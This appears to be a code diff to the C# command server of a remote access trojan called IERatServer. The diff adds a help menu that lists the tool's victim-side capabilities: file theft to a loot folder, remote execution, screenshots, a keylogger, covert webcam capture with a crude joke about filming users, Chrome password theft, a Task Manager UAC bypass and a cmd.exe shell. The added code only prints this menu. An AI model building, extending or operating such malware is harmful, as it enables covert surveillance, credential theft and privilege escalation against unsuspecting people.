@@ -84,6 +84,9 @@ namespace IERatServer
             [Command(typeof(CopyCommand), Description = "Copy a file")]
             cp,
 
+            [Command(typeof(HelpCommand2), Description = "Print help menu")]
+            help,
+
             [Command(typeof(UacTmCommand), Description = "Bypass UAC using the Task Manager method")]
             uacbypass_taskmanager,
 
@@ -398,6 +401,50 @@ namespace IERatServer
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
                 AddTaskToActiveAgent("kill");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+        class HelpCommand2 : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                Console.WriteLine("\nManagement Commands");
+                Console.WriteLine("===================");
+                Console.WriteLine("list - Print information about the active agents");
+                Console.WriteLine("history - Print information about commands and their results");
+                Console.WriteLine("interact <agent number> - interact with an agent");
+                Console.WriteLine("timeout <number> - set the inactivity time in seconds for agent disconnections");
+                Console.WriteLine("clear - clear the CLI from messages");
+                Console.WriteLine("exit - kill the server");
+
+                Console.WriteLine("\nFile Commands");
+                Console.WriteLine("===================");
+                Console.WriteLine("ls - list folders and files in the agent's current directory");
+                Console.WriteLine("mv <source> <destination> - move a file or a folder, change a file's name");
+                Console.WriteLine("cp <source> <destination> - copy a file or a folder");
+                Console.WriteLine("del <destination> - delete a file or a folder");
+                Console.WriteLine("upload <location on server> - upload a file to the agent's current directory");
+                Console.WriteLine("download <location on agent> - download a file to to the loot folder");
+                Console.WriteLine("exec <file to run> - execute a file");
+
+                Console.WriteLine("\nSpy Shit");
+                Console.WriteLine("=========");
+                Console.WriteLine("screenshot - take a screenshot of the active desktop");
+                Console.WriteLine("keylogger <start/stop/collect/clear> - start/stop a keylogger thread, collect results or clear them");
+                Console.WriteLine("capture_camera - capture a webcam image of the user jerking off or something...");
+
+                Console.WriteLine("\nCredentials");
+                Console.WriteLine("============");
+                Console.WriteLine("chrome - get all chrome passwords");
+
+                Console.WriteLine("\nPrivileges");
+                Console.WriteLine("==========");
+                Console.WriteLine("uacbypass_taskmanager - Bypass UAC using the taskmanager cleanup task method");
+
+                Console.WriteLine("\nCommand execution");
+                Console.WriteLine("==========");
+                Console.WriteLine("shell - run a shell command using cmd.exe (not recommended)\n");
+
                 return Task.FromResult(CommandResult.Success);
             }
         }
